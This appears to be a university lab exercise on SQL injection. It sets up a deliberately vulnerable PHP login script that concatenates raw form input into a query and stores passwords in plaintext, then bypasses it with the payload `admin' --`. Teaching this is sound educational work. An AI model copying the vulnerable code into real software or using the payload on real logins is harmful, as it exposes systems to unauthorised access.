# Ex 1 — SQL Injection

**Aim:** Demonstrate an SQL injection attack and its impact on a login form.

**Apparatus / Tools required:** XAMPP/WAMP (PHP + MySQL), a browser.

**Algorithm**
1. Take username/password from the POST form.
2. Build a SQL query by directly concatenating the raw input into the string.
3. Run the query; if it returns a row, report success.

**Procedure**
```sql
CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50) NOT NULL,
  password VARCHAR(50) NOT NULL
);
INSERT INTO users (username, password) VALUES ('admin','admin123'),('user','user123');
```
Serve `login.php` with XAMPP/WAMP, then attack with:
- Username: `admin' --`
- Password: (blank)

The query becomes:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='';
```
`--` comments out the password check.

**Program**
```php
<?php
$conn = new mysqli('localhost', 'root', '', 'test_db');

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Vulnerable query - no sanitisation
    $sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        echo "Login Successful!";
    } else {
        echo "Invalid Credentials!";
    }
}
?>
<form method="POST" action="">
    Username: <input type="text" name="username"><br>
    Password: <input type="password" name="password"><br>
    <button type="submit">Login</button>
</form>
```

**Sample Output**
```
Login Successful!
```

**Result:** An SQL injection attack was demonstrated successfully, bypassing the login form's authentication check.

## Notes
Mitigation: use prepared statements (`mysqli::prepare`) instead of string concatenation.

## Viva
See [VIVA.md](VIVA.md) for exercise-specific questions. General questions are in the [base VIVA.md](../VIVA.md).
